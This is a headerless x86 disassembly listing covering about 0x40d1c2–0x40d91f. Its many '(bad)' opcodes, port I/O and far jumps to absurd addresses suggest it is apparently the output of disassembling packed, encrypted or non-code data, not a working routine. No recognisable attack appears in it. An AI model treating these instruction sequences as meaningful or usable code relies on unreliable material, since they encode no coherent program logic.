  40d1c2:	test   BYTE PTR [edi-0x38bf0d7c],bl
  40d1c8:	sar    DWORD PTR [eax],cl
  40d1ca:	adc    al,0xfa
  40d1cc:	push   cs
  40d1cd:	aam    0xe3
  40d1cf:	nop
  40d1d0:	cwde   
  40d1d1:	xchg   DWORD PTR [edi],edx
  40d1d3:	sbb    al,BYTE PTR [edi-0x3de4b721]
  40d1d9:	pop    edx
  40d1da:	repz mov es,WORD PTR [ebx-0x19e407b8]
  40d1e1:	inc    esi
  40d1e2:	shl    BYTE PTR [esp+ecx*2+0x21],0x8
  40d1e7:	les    edx,FWORD PTR [edi-0x23dc925b]
  40d1ed:	imul   ecx,ecx,0x7b2f2af4
  40d1f3:	jbe    0x40d1cf
  40d1f5:	push   cs
  40d1f6:	ficom  DWORD PTR [edx]
  40d1f8:	clc    
  40d1f9:	arpl   WORD PTR [edi+0x60],di
  40d1fc:	mov    al,0x50
  40d1ff:	lock outs dx,BYTE PTR ds:[esi]
  40d201:	stos   BYTE PTR es:[edi],al
  40d202:	imul   esi,esi,0xfffffffa
  40d205:	lahf   
  40d206:	cmp    DWORD PTR [edi],esi
  40d208:	(bad)  
  40d209:	adc    dh,bl
  40d20b:	out    0x7d,al
  40d20d:	nop
  40d20e:	repnz mov WORD PTR [eax-0x6b8991f9],cs
  40d215:	les    esp,FWORD PTR [ebp+edi*1+0x44981d24]
  40d21c:	in     al,0x1f
  40d21e:	stc    
  40d21f:	fsub   DWORD PTR [ebx-0x451658c9]
  40d225:	xor    dh,BYTE PTR ds:0x9b3a78a6
  40d22b:	add    dh,BYTE PTR [ebp-0x7f]
  40d22e:	mov    eax,ds:0xdf5b59e5
  40d233:	adc    BYTE PTR [eax+0x8],cl
  40d236:	or     eax,edx
  40d238:	call   0x245cf782
  40d23d:	cmp    ebp,DWORD PTR [edx]
  40d23f:	cdq    
  40d240:	pop    ss
  40d241:	outs   dx,BYTE PTR ds:[esi]
  40d242:	xor    eax,0x8ba3c8fc
  40d247:	pop    esi
  40d248:	xchg   ebp,eax
  40d249:	gs dec ebp
  40d24b:	leave  
  40d24c:	mov    ecx,0xc22254c5
  40d251:	sub    al,BYTE PTR [edx]
  40d253:	push   edx
  40d254:	popf   
  40d255:	ret    0x1eb
  40d258:	mov    edx,0x9ab39a02
  40d25d:	retf   0x2871
  40d260:	clc    
  40d261:	mov    WORD PTR [ebx],ds
  40d263:	mov    eax,0x257d10d6
  40d268:	fldenv [edx-0x2]
  40d26b:	bnd jge 0x40d209
  40d26e:	rcl    bl,cl
  40d270:	(bad)  
  40d272:	sbb    bl,bl
  40d274:	fst    DWORD PTR [edi]
  40d276:	mov    ds:0xb6121826,al
  40d27b:	mov    ah,0x97
  40d27d:	xchg   ebx,eax
  40d27e:	jp     0x40d282
  40d280:	enter  0xdffe,0x5f
  40d284:	cmp    BYTE PTR [ebp-0x1b23f0d1],0x17
  40d28b:	ss retf 
  40d28d:	push   edi
  40d28e:	pop    ecx
  40d28f:	fs jae 0x40d2cf
  40d292:	lds    edx,FWORD PTR [ebp-0x65241642]
  40d298:	push   es
  40d299:	or     al,0x29
  40d29b:	inc    ebx
  40d29c:	mov    ebp,0xf45f8953
  40d2a1:	(bad)  
  40d2a2:	pop    ds
  40d2a3:	cmp    bh,bh
  40d2a5:	dec    eax
  40d2a6:	push   esp
  40d2a7:	gs inc esi
  40d2a9:	ja     0x40d325
  40d2ab:	and    BYTE PTR [ecx-0x35],dh
  40d2ae:	pop    ebx
  40d2af:	scas   al,BYTE PTR es:[edi]
  40d2b0:	push   esi
  40d2b1:	ret    0x6a6
  40d2b4:	push   ds
  40d2b5:	pop    eax
  40d2b6:	adc    eax,0x672c4558
  40d2bb:	adc    ch,bh
  40d2bd:	loop   0x40d2ab
  40d2bf:	push   ecx
  40d2c0:	outs   dx,DWORD PTR ds:[esi]
  40d2c1:	dec    ebx
  40d2c2:	mov    esp,0xf0598f30
  40d2c7:	repnz dec edi
  40d2c9:	dec    ebx
  40d2ca:	sbb    DWORD PTR [eax+0x2f],edi
  40d2cd:	mov    bh,0xf9
  40d2cf:	(bad)  
  40d2d0:	fld    DWORD PTR [eax]
  40d2d2:	sbb    esp,esp
  40d2d4:	movq   mm3,QWORD PTR [eax-0x6f58b568]
  40d2db:	and    DWORD PTR ds:0x2a5ad3fc,0x6b0bfbf
  40d2e5:	cmp    DWORD PTR [ebx],0xbb24513a
  40d2eb:	into   
  40d2ec:	inc    esi
  40d2ed:	xor    al,0x63
  40d2ef:	and    bl,dl
  40d2f1:	sbb    ebp,DWORD PTR [esi]
  40d2f3:	iret   
  40d2f4:	cbw    
  40d2f6:	dec    ecx
  40d2f7:	call   0x13323625
  40d2fc:	add    BYTE PTR [edi+eiz*1],al
  40d2ff:	gs push cs
  40d301:	dec    edx
  40d302:	mov    ebx,0x379ce389
  40d307:	outs   dx,BYTE PTR ds:[esi]
  40d308:	shr    DWORD PTR [eax+eax*4],1
  40d30b:	xor    bl,ch
  40d30d:	cli    
  40d30e:	xor    BYTE PTR [esi+0x6c],cl
  40d311:	sbb    DWORD PTR [edi],eax
  40d313:	xchg   edi,eax
  40d314:	call   0x31a:0x137d35d2
  40d31b:	inc    ebp
  40d31c:	inc    edx
  40d31d:	push   ebx
  40d31e:	push   0x5e
  40d320:	retf   0x910e
  40d323:	sub    DWORD PTR [eax+0x32f65878],edi
  40d329:	sbb    DWORD PTR [ecx-0x4c],edx
  40d32c:	out    0x3b,eax
  40d32e:	push   ss
  40d32f:	jp     0x40d341
  40d331:	or     DWORD PTR [ecx-0x31b58324],0xffffffa5
  40d338:	mov    esi,0x11e18585
  40d33d:	ja     0x40d345
  40d33f:	popa   
  40d340:	dec    ebp
  40d341:	dec    esp
  40d342:	jle    0x40d33f
  40d344:	lea    edi,[edi+0x7d]
  40d347:	test   DWORD PTR [edx],0x5e1b0df1
  40d34d:	in     al,dx
  40d34e:	cmp    cl,dh
  40d350:	stc    
  40d351:	sbb    al,0x5a
  40d353:	icebp  
  40d354:	test   al,bl
  40d356:	pop    ebp
  40d357:	popf   
  40d358:	arpl   WORD PTR [eax-0x2f],si
  40d35b:	loope  0x40d31f
  40d35d:	(bad)  
  40d35e:	jo     0x40d3de
  40d360:	push   ds
  40d361:	cmp    al,BYTE PTR [ecx]
  40d363:	mov    esp,0xa9eb6bc5
  40d368:	dec    ebp
  40d369:	jno    0x40d350
  40d36b:	jp     0x40d3b0
  40d36d:	mov    ebp,0x465ab39c
  40d372:	std    
  40d373:	cmp    ch,BYTE PTR [ebx+0x54]
  40d376:	sub    edx,esi
  40d378:	push   edx
  40d379:	(bad)  
  40d37a:	push   ss
  40d37b:	ror    BYTE PTR [ebp-0xb],cl
  40d37e:	and    BYTE PTR [eax-0x52be0914],cl
  40d384:	mov    esi,0xdafe89f2
  40d389:	push   0xffffffb7
  40d38b:	adc    ah,BYTE PTR [eax+ebp*8-0x8]
  40d38f:	mov    WORD PTR [eax],ss
  40d391:	jbe    0x40d35c
  40d393:	sub    eax,0xffffffa0
  40d396:	lahf   
  40d397:	mov    cl,0x3
  40d399:	repz cmp bl,BYTE PTR [ebx-0xce27a23]
  40d3a0:	shl    DWORD PTR [eax+0x1cb1162b],0xfe
  40d3a7:	mov    ds:0x3c5e2602,eax
  40d3ac:	rcl    dh,1
  40d3ae:	sti    
  40d3af:	sbb    al,0x18
  40d3b1:	(bad)  
  40d3b3:	inc    ecx
  40d3b4:	mov    esp,0xa844947b
  40d3b9:	mov    ecx,0x7423f107
  40d3be:	sub    BYTE PTR [esi+0x11a6c12a],cl
  40d3c4:	punpckhdq mm1,QWORD PTR [edx-0x5c]
  40d3c8:	mov    ebp,0xeb994457
  40d3cd:	and    dh,cl
  40d3cf:	loop   0x40d41f
  40d3d1:	jmp    0xd807b464
  40d3d6:	stc    
  40d3d7:	sub    esp,eax
  40d3d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3da:	addr16 inc ecx
  40d3dc:	fmul   st,st(5)
  40d3de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3df:	rcr    eax,cl
  40d3e1:	(bad)  
  40d3e2:	dec    edi
  40d3e3:	add    edi,DWORD PTR [ebp+ebx*4+0x77cd4c48]
  40d3ea:	xlat   BYTE PTR ds:[ebx]
  40d3eb:	js     0x40d39e
  40d3ed:	push   edx
  40d3ee:	aas    
  40d3ef:	sbb    ebp,DWORD PTR ds:[esi+0x5f]
  40d3f3:	push   0xffffffaf
  40d3f5:	cmp    edi,esi
  40d3f7:	rcl    DWORD PTR [edi-0x6c04b78a],cl
  40d3fd:	jbe    0x40d459
  40d3ff:	adc    ch,BYTE PTR [edi-0x72]
  40d402:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d403:	jnp    0x40d447
  40d405:	imul   esp,DWORD PTR [eax+edi*8],0x2590f499
  40d40c:	shl    edx,1
  40d40e:	daa    
  40d40f:	in     eax,dx
  40d410:	jae    0x40d47a
  40d412:	inc    edx
  40d413:	sti    
  40d414:	leave  
  40d415:	adc    eax,0x53434152
  40d41a:	mov    BYTE PTR [edx],dh
  40d41c:	arpl   WORD PTR [eax],dx
  40d41e:	nop
  40d41f:	push   esi
  40d420:	or     eax,ebx
  40d422:	mov    ebx,esp
  40d424:	pop    esi
  40d425:	dec    ecx
  40d426:	mov    ds:0xf8b32fd7,eax
  40d42b:	rol    BYTE PTR [esi],1
  40d42d:	loopne 0x40d3d5
  40d42f:	pusha  
  40d430:	jle    0x40d447
  40d432:	(bad)  
  40d433:	dec    ebp
  40d434:	jnp    0x40d3db
  40d436:	dec    edi
  40d437:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d438:	cmp    DWORD PTR [ebp-0x48d03298],ecx
  40d43e:	cld    
  40d43f:	jp     0x40d47d
  40d441:	lock cmp DWORD PTR [edx],ebx
  40d444:	sub    edx,ecx
  40d446:	mov    ds:0x8da732a5,eax
  40d44b:	sub    eax,0xf34b7756
  40d450:	xchg   ebp,eax
  40d451:	push   esp
  40d452:	sub    DWORD PTR [ecx+0x1b],ebp
  40d455:	and    BYTE PTR [ebx-0x51],ah
  40d458:	or     eax,0xaf83cbb1
  40d45d:	add    al,0xe0
  40d45f:	leave  
  40d460:	idiv   ebp
  40d462:	xadd   BYTE PTR [edi-0x76],bl
  40d466:	(bad)  
  40d467:	mov    eax,0xa38ae855
  40d46c:	push   ebp
  40d46d:	lahf   
  40d46e:	cld    
  40d46f:	je     0x40d44b
  40d471:	retf   0x816f
  40d474:	add    DWORD PTR [eax],ecx
  40d476:	ret    0x6e54
  40d479:	fstp   DWORD PTR [esi-0x11d7d23f]
  40d47f:	in     al,0x9c
  40d481:	fisubr DWORD PTR [eax+0x20]
  40d484:	dec    esp
  40d485:	sar    BYTE PTR [edi+esi*2+0x33],0x56
  40d48a:	jge    0x40d439
  40d48c:	shl    BYTE PTR [edi-0x550b0304],1
  40d492:	test   eax,0x96618f0a
  40d497:	push   cs
  40d498:	mov    ecx,ecx
  40d49a:	hlt    
  40d49b:	push   ss
  40d49c:	std    
  40d49d:	jp     0x40d47f
  40d49f:	adc    eax,0x8a3ce50f
  40d4a4:	mov    ds:0xeeb7b678,al
  40d4a9:	xor    eax,0xcbef41da
  40d4ae:	out    0x13,al
  40d4b0:	pop    ebp
  40d4b1:	mov    eax,ds:0xc4dd2591
  40d4b6:	jg     0x40d525
  40d4b8:	ret    
  40d4b9:	lahf   
  40d4ba:	push   cs
  40d4bb:	mov    ecx,0x2726101f
  40d4c0:	aaa    
  40d4c1:	or     ebp,DWORD PTR [ebp-0x37]
  40d4c4:	sti    
  40d4c5:	dec    eax
  40d4c6:	pop    ebp
  40d4c7:	(bad)  
  40d4c8:	sub    eax,0x5d6a65c2
  40d4cd:	xchg   ebx,eax
  40d4ce:	scas   al,BYTE PTR es:[edi]
  40d4cf:	lock jb 0x40d4c5
  40d4d2:	jbe    0x40d4b0
  40d4d4:	jge    0x40d4c7
  40d4d6:	push   edi
  40d4d7:	mov    bh,0xe0
  40d4d9:	or     eax,0x2f66e233
  40d4de:	adc    dh,BYTE PTR [ecx+ebx*1-0x2e]
  40d4e2:	fnstsw WORD PTR [edi-0x2d]
  40d4e5:	xor    eax,0xb0e480c0
  40d4ea:	lahf   
  40d4eb:	jo     0x40d47c
  40d4ed:	push   ebp
  40d4ee:	mov    ch,0xf7
  40d4f0:	out    0x84,eax
  40d4f2:	ret    
  40d4f3:	xor    eax,0x6906e749
  40d4f8:	(bad)  
  40d4f9:	bound  ebp,QWORD PTR [ebx-0xc3c8362]
  40d4ff:	sub    eax,0x85f031f5
  40d504:	xchg   edx,eax
  40d505:	mov    eax,ds:0x440b30a8
  40d50a:	and    esp,DWORD PTR [eax+ebx*1+0x43]
  40d50e:	test   eax,0xcc197c42
  40d513:	lods   al,BYTE PTR ds:[esi]
  40d514:	mov    ds:0xf105df90,eax
  40d519:	inc    eax
  40d51a:	pop    ebx
  40d51b:	(bad)  
  40d51c:	fnsave [ecx+edi*8+0x58]
  40d520:	popf   
  40d521:	imul   ebp,DWORD PTR [ebx+edx*2+0x5141b3a4],0xe8b36f17
  40d52c:	sbb    ecx,esi
  40d52e:	cwde   
  40d52f:	leave  
  40d530:	jns    0x40d558
  40d532:	imul   edx,edi,0xffffffe2
  40d535:	cdq    
  40d536:	pop    ecx
  40d537:	pop    esp
  40d538:	imul   ecx,DWORD PTR [edx],0xffffff9c
  40d53b:	aad    0x6b
  40d53d:	sti    
  40d53e:	cmp    BYTE PTR [ebx+0x66c3006d],ch
  40d544:	mov    cs,WORD PTR [edx-0x12eb376f]
  40d54a:	cmp    eax,ecx
  40d54c:	pop    es
  40d54d:	fcom   QWORD PTR [eax-0x75b1fe8]
  40d553:	hlt    
  40d554:	loopne 0x40d502
  40d556:	fs jae 0x40d59a
  40d559:	push   ss
  40d55a:	retf   0x4764
  40d55d:	lods   al,BYTE PTR ds:[esi]
  40d55e:	dec    ecx
  40d55f:	mov    ebp,0x95fcd4f
  40d564:	xchg   edi,eax
  40d565:	jae    0x40d526
  40d567:	(bad)  
  40d568:	hlt    
  40d569:	outs   dx,DWORD PTR ds:[esi]
  40d56a:	dec    ebp
  40d56b:	ds dec edi
  40d56d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d56e:	pop    edx
  40d56f:	mov    dh,0xcd
  40d571:	stos   DWORD PTR es:[edi],eax
  40d572:	pop    ebx
  40d573:	(bad)  
  40d574:	sahf   
  40d575:	mov    dl,0x85
  40d577:	nop
  40d578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d579:	shl    BYTE PTR ds:[ecx],1
  40d57c:	fucom  st(7)
  40d57e:	sub    edx,esp
  40d580:	jl     0x40d559
  40d582:	icebp  
  40d583:	ins    DWORD PTR es:[edi],dx
  40d584:	rcl    cl,0xa1
  40d587:	std    
  40d588:	sub    bh,BYTE PTR [edi+0x249e129c]
  40d58e:	mov    bl,0x9c
  40d590:	mov    dh,0xc3
  40d592:	(bad)  
  40d593:	xlat   BYTE PTR ds:[ebx]
  40d594:	inc    ebx
  40d595:	cmp    eax,0xbafea8d7
  40d59a:	and    edx,DWORD PTR [edx+0x5]
  40d59d:	mov    ah,0xb0
  40d59f:	imul   esp,ebx,0x8c3adbee
  40d5a5:	cmp    dl,ch
  40d5a7:	adc    al,0x32
  40d5a9:	xlat   BYTE PTR ds:[ebx]
  40d5aa:	xor    DWORD PTR [edi],0x3b
  40d5ad:	push   edi
  40d5ae:	and    esi,DWORD PTR [ebp+0x6f]
  40d5b1:	(bad)  
  40d5b2:	dec    ecx
  40d5b3:	xor    al,0x40
  40d5b5:	mov    esp,0x9c653bae
  40d5ba:	mov    BYTE PTR ds:0x808f964e,ch
  40d5c0:	add    esi,DWORD PTR [eax+0x68]
  40d5c3:	pop    ds
  40d5c4:	push   esi
  40d5c5:	cld    
  40d5c6:	jg     0x40d56c
  40d5c8:	ins    BYTE PTR es:[edi],dx
  40d5c9:	pop    esp
  40d5ca:	shl    DWORD PTR [edx],0x6c
  40d5cd:	push   ds
  40d5ce:	xor    bl,BYTE PTR [esi+ecx*8]
  40d5d1:	jbe    0x40d5df
  40d5d3:	adc    ebx,esp
  40d5d5:	xchg   ebx,eax
  40d5d6:	cmp    eax,DWORD PTR [ecx-0x46ede875]
  40d5dc:	push   ecx
  40d5dd:	dec    edx
  40d5de:	jge    0x40d594
  40d5e0:	cmp    DWORD PTR [edi],eax
  40d5e2:	xchg   edi,eax
  40d5e3:	dec    eax
  40d5e4:	fisubr WORD PTR [esp+eax*1-0x7f]
  40d5e8:	xor    BYTE PTR [edi+0x45],dh
  40d5eb:	sub    al,BYTE PTR [ecx+eiz*2-0x3d]
  40d5ef:	sbb    DWORD PTR [ebx-0x38],edx
  40d5f2:	cmp    DWORD PTR [ebx+0x70363eb6],ebx
  40d5f8:	fwait
  40d5f9:	mov    al,0x54
  40d5fb:	add    dh,BYTE PTR [ecx]
  40d5fd:	or     ebp,DWORD PTR [eax+0x64]
  40d600:	cld    
  40d601:	xor    DWORD PTR [eax+0x6f],0x877bd0af
  40d608:	aam    0xd7
  40d60a:	daa    
  40d60b:	mov    ecx,DWORD PTR [eax+0x7a]
  40d60e:	mov    ebx,0x76f253c4
  40d613:	bound  ebx,QWORD PTR [ecx-0x7]
  40d616:	push   eax
  40d617:	xchg   ecx,eax
  40d618:	jb     0x40d5e8
  40d61a:	sbb    cl,BYTE PTR [ecx]
  40d61c:	cs inc esp
  40d61e:	jmp    0xba2feeab
  40d623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d624:	push   ecx
  40d625:	cld    
  40d626:	sbb    DWORD PTR [eax+0x5fd1394b],edx
  40d62c:	pop    edi
  40d62d:	imul   ebx,esi,0x47
  40d630:	adc    eax,DWORD PTR [ecx]
  40d632:	mov    bl,0x30
  40d634:	inc    edi
  40d635:	push   edx
  40d636:	iret   
  40d637:	mov    esi,0x32e50579
  40d63c:	mov    esi,0x868861d
  40d641:	leave  
  40d642:	xchg   ebp,eax
  40d643:	inc    eax
  40d644:	aaa    
  40d645:	and    al,0xf
  40d647:	jno    0x40d6b5
  40d649:	jecxz  0x40d5fe
  40d64b:	xor    BYTE PTR [edx],al
  40d64d:	sbb    DWORD PTR [eax+0x37d3c139],esi
  40d653:	sbb    al,0xf5
  40d655:	pop    esp
  40d656:	jno    0x40d665
  40d658:	imul   DWORD PTR [ebx-0x52]
  40d65b:	inc    eax
  40d65c:	xchg   DWORD PTR ds:0xc547f149,ebx
  40d662:	cmp    al,0x4a
  40d664:	out    0x36,al
  40d666:	lahf   
  40d667:	jb     0x40d65c
  40d669:	push   esp
  40d66a:	psllq  mm4,QWORD PTR [ebx-0x1b5ffba1]
  40d671:	int3   
  40d672:	sbb    BYTE PTR [eax-0x65],bh
  40d675:	pop    edx
  40d676:	mov    ds,WORD PTR [eax-0x18]
  40d679:	adc    esp,0xffffffc9
  40d67c:	fstp   QWORD PTR [esi+0xc853c94]
  40d682:	repz adc BYTE PTR [ebx],cl
  40d685:	xchg   esp,eax
  40d686:	adc    eax,esp
  40d688:	or     DWORD PTR [ebx],0x4f5103
  40d68e:	call   0x79fd0109
  40d693:	add    eax,0x675260e
  40d698:	mov    ebp,0x6b832d10
  40d69d:	sbb    eax,0x52f1ca33
  40d6a2:	ret    
  40d6a3:	cmp    BYTE PTR [edi-0x5e],dh
  40d6a6:	xor    dl,BYTE PTR [edi+0x9e150e9]
  40d6ac:	and    al,0x10
  40d6ae:	or     al,0xc0
  40d6b0:	push   ecx
  40d6b1:	cmp    ecx,DWORD PTR [ebp+0x2cbf79e1]
  40d6b7:	inc    eax
  40d6b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6b9:	hlt    
  40d6ba:	loopne 0x40d71f
  40d6bc:	inc    eax
  40d6bd:	lock scas al,BYTE PTR es:[edi]
  40d6bf:	push   ebx
  40d6c0:	pop    eax
  40d6c1:	xchg   edi,eax
  40d6c2:	mov    esp,0x9260abeb
  40d6c7:	push   ecx
  40d6c8:	cli    
  40d6c9:	jle    0x40d72b
  40d6cb:	jg     0x40d6e8
  40d6cd:	shl    DWORD PTR [ebp-0x73e24124],cl
  40d6d3:	aaa    
  40d6d4:	and    DWORD PTR [ebp-0x70f962c1],ecx
  40d6da:	(bad)  
  40d6db:	add    al,0xb1
  40d6dd:	or     bh,al
  40d6df:	cs mov cl,0x8f
  40d6e2:	cs dec esp
  40d6e4:	hlt    
  40d6e5:	cmp    DWORD PTR [eax+0x1486c81b],0xfffffff6
  40d6ec:	popa   
  40d6ed:	fdiv   QWORD PTR [ebx-0x3a599502]
  40d6f3:	fmul   QWORD PTR [eax-0x7e2e6af0]
  40d6f9:	mov    edx,0x1d03934c
  40d6fe:	inc    ebx
  40d6ff:	cmp    BYTE PTR [eax+0x52],ah
  40d702:	jno    0x40d751
  40d704:	sub    edx,ecx
  40d706:	jae    0x40d6ec
  40d708:	mov    ds:0xb0ad9d0b,al
  40d70d:	mov    edx,DWORD PTR [edi]
  40d70f:	out    dx,eax
  40d710:	sub    eax,DWORD PTR [ecx+0x58]
  40d713:	sub    al,0xb7
  40d715:	jbe    0x40d770
  40d717:	outs   dx,DWORD PTR ds:[esi]
  40d718:	cmp    ch,BYTE PTR [esi]
  40d71a:	arpl   bx,di
  40d71c:	push   edi
  40d71d:	adc    ecx,DWORD PTR [ebp-0x170dadd6]
  40d723:	out    dx,al
  40d724:	enter  0xa0fc,0xc3
  40d728:	call   0xada:0x18f5d82e
  40d72f:	jae    0x40d73d
  40d731:	and    DWORD PTR [ecx-0x2bddbd4e],ebx
  40d737:	test   eax,0x921a1b14
  40d73c:	xor    BYTE PTR ds:0x43ee7520,dl
  40d742:	push   ss
  40d743:	mov    gs,WORD PTR [edi+0x5b]
  40d746:	cwde   
  40d747:	fs mov ch,0xbb
  40d74a:	ss clc 
  40d74c:	fst    QWORD PTR [ebx+eax*2-0x4c]
  40d750:	mov    dh,0x71
  40d752:	es inc esp
  40d754:	and    DWORD PTR [ebp+0x57],ebx
  40d757:	sti    
  40d758:	push   esi
  40d759:	dec    ecx
  40d75a:	jmp    0x1e6:0xfeac41a
  40d761:	inc    esp
  40d762:	jns    0x40d7d2
  40d764:	test   al,0xc5
  40d766:	aas    
  40d767:	das    
  40d768:	jnp    0x40d6fd
  40d76a:	ret    0xcb91
  40d76d:	mov    ch,0x4f
  40d76f:	lahf   
  40d770:	ss icebp 
  40d772:	mov    dl,0x2a
  40d774:	pop    esi
  40d775:	jns    0x40d712
  40d777:	mov    ch,BYTE PTR [edx-0xf]
  40d77a:	ja     0x40d700
  40d77c:	jle    0x40d7c9
  40d77e:	and    BYTE PTR [eax],ah
  40d780:	call   0xb10cb24b
  40d785:	xor    dh,bl
  40d787:	add    esp,DWORD PTR [ecx-0x53]
  40d78a:	pop    edx
  40d78b:	push   es
  40d78c:	dec    eax
  40d78d:	addr16 (bad) 
  40d78f:	xlat   BYTE PTR ds:[ebx]
  40d790:	cdq    
  40d791:	sbb    cl,BYTE PTR [ebx+0x48]
  40d794:	ss (bad) 
  40d796:	leave  
  40d797:	sub    DWORD PTR [ebp+0x49],0xfffffffc
  40d79b:	repz dec edi
  40d79d:	or     al,0x76
  40d79f:	inc    esp
  40d7a0:	add    al,0xde
  40d7a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7a3:	aas    
  40d7a4:	cmc    
  40d7a5:	sbb    al,0xf1
  40d7a7:	mov    ebp,0x7eebfc81
  40d7ac:	inc    esp
  40d7ad:	xor    al,0xde
  40d7af:	xchg   ecx,eax
  40d7b0:	or     BYTE PTR [edx+0x620118e5],al
  40d7b6:	ins    BYTE PTR es:[edi],dx
  40d7b7:	add    cl,bh
  40d7b9:	movntps XMMWORD PTR [eax-0x556e71fc],xmm6
  40d7c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7c1:	ficomp WORD PTR [eax+esi*2]
  40d7c4:	sbb    eax,0x4ad010ce
  40d7c9:	int    0xe0
  40d7cb:	lds    ebp,FWORD PTR ds:0x9b51e17a
  40d7d1:	or     DWORD PTR [edx-0x10],ebp
  40d7d4:	mov    ecx,0x20153c24
  40d7d9:	(bad)  
  40d7da:	mov    dl,0x98
  40d7dc:	jl     0x40d7a3
  40d7de:	sbb    eax,DWORD PTR [ebp+0x50ad4f4a]
  40d7e4:	mov    ecx,DWORD PTR [edi+ecx*1-0x26450239]
  40d7eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7ec:	je     0x40d82d
  40d7ee:	dec    DWORD PTR [ecx+ebx*2-0x39949d2d]
  40d7f5:	adc    BYTE PTR [esi-0x51],dl
  40d7f8:	icebp  
  40d7f9:	push   edi
  40d7fa:	dec    eax
  40d7fb:	in     al,0x23
  40d7fd:	and    eax,ecx
  40d7ff:	or     DWORD PTR [edi-0x34177dd7],ebx
  40d805:	les    ebx,FWORD PTR [ebx]
  40d807:	xchg   edx,eax
  40d808:	rol    BYTE PTR [ebx+0x7d],1
  40d80b:	pop    edx
  40d80c:	sub    DWORD PTR ds:0x7031d90d,ecx
  40d812:	push   edi
  40d813:	mov    edi,0xbf0e5fe7
  40d818:	xor    BYTE PTR ds:0x94b911a1,dl
  40d81e:	mul    DWORD PTR [eax+eax*8-0x7]
  40d822:	adc    BYTE PTR [esi],ch
  40d824:	dec    edi
  40d825:	in     al,dx
  40d826:	out    dx,al
  40d827:	outs   dx,BYTE PTR ds:[esi]
  40d828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d829:	outs   dx,BYTE PTR ds:[esi]
  40d82a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d82b:	scas   al,BYTE PTR es:[edi]
  40d82c:	and    dh,BYTE PTR [esi]
  40d82e:	push   ecx
  40d82f:	mov    al,ds:0x9b83aef0
  40d834:	mov    esp,0x1b358583
  40d839:	cdq    
  40d83a:	cs (bad) 
  40d83c:	lods   al,BYTE PTR ds:[esi]
  40d83d:	adc    bh,BYTE PTR [edx]
  40d83f:	loop   0x40d82b
  40d841:	stos   DWORD PTR es:[edi],eax
  40d842:	push   ds
  40d843:	mov    ds,eax
  40d845:	cmc    
  40d846:	in     eax,0x30
  40d848:	in     al,dx
  40d849:	add    ecx,DWORD PTR [edi]
  40d84b:	push   ebx
  40d84c:	out    0x0,eax
  40d84e:	data16 test al,0x19
  40d851:	mov    dl,BYTE PTR [edx+ecx*4]
  40d854:	int3   
  40d855:	xchg   ebx,eax
  40d856:	and    DWORD PTR [ebp+0xd],0x3d
  40d85a:	(bad)  
  40d85b:	pushf  
  40d85c:	add    DWORD PTR [ebp+0x25728dcb],eax
  40d862:	lock pop esp
  40d864:	ds add al,0xf0
  40d867:	out    0xe6,eax
  40d869:	mov    al,ds:0xeb251ab4
  40d86e:	mov    edx,0xd0cf18c
  40d873:	loopne 0x40d8db
  40d875:	sbb    edi,esp
  40d877:	ja     0x40d82d
  40d879:	mov    al,0x3
  40d87b:	cmp    dl,bh
  40d87d:	sbb    DWORD PTR [ebx+0x395e6890],edi
  40d883:	pop    ds
  40d884:	add    al,0x80
  40d886:	hlt    
  40d887:	stos   BYTE PTR es:[edi],al
  40d888:	mov    ch,0xc7
  40d88a:	mov    edi,0x9171df20
  40d88f:	arpl   WORD PTR [ebp+0x51],ax
  40d892:	push   edx
  40d893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d894:	mov    bh,0x89
  40d896:	test   DWORD PTR [edx-0x6e],esi
  40d899:	xor    BYTE PTR [di+0x28],bl
  40d89d:	pop    ebp
  40d89e:	push   edx
  40d89f:	test   edi,0xe67bcc23
  40d8a5:	and    cl,dl
  40d8a7:	stc    
  40d8a8:	sub    al,0x71
  40d8aa:	add    al,0xa6
  40d8ac:	push   ss
  40d8ad:	outs   dx,DWORD PTR ds:[esi]
  40d8ae:	rcr    DWORD PTR [ebx-0x6b],1
  40d8b1:	add    ebp,DWORD PTR [esi-0xd]
  40d8b4:	les    ecx,FWORD PTR [ebx]
  40d8b6:	aad    0x5a
  40d8b8:	je     0x40d8a4
  40d8ba:	js     0x25d11250
  40d8c0:	fbstp  TBYTE PTR [ecx-0x1f]
  40d8c3:	inc    ecx
  40d8c4:	inc    esp
  40d8c5:	jge    0x40d8a7
  40d8c7:	jb     0x40d914
  40d8c9:	retf   0x44de
  40d8cc:	xchg   ebx,eax
  40d8cd:	push   0x90a079cf
  40d8d2:	inc    ebp
  40d8d3:	push   ds
  40d8d4:	push   esi
  40d8d5:	ror    ecx,cl
  40d8d7:	test   BYTE PTR [edi+0x5dee6e3],al
  40d8dd:	addr16 mov ds:0xf944,eax
  40d8e1:	rcr    DWORD PTR [ebx],1
  40d8e3:	lahf   
  40d8e4:	lds    edi,FWORD PTR [ebp-0x51]
  40d8e7:	adc    bh,BYTE PTR [ecx-0x68193302]
  40d8ed:	cwde   
  40d8ee:	sub    DWORD PTR [ecx+0x44afe9a8],esi
  40d8f4:	mov    eax,DWORD PTR [ebx*1-0x3fce215]
  40d8fb:	int3   
  40d8fc:	dec    edx
  40d8fd:	inc    esp
  40d8fe:	dec    esp
  40d8ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d900:	rcl    DWORD PTR [ecx],cl
  40d902:	sbb    cl,BYTE PTR [edx-0x7a]
  40d905:	sub    DWORD PTR [edx-0x5e78f563],ebp
  40d90b:	inc    esp
  40d90c:	sbb    BYTE PTR [edx+0x101c3a89],al
  40d912:	adc    DWORD PTR [esi+esi*2+0x7c366b50],edx
  40d919:	sbb    al,BYTE PTR [ebx-0x8981289]
  40d91f:	jns    0x40d8fe
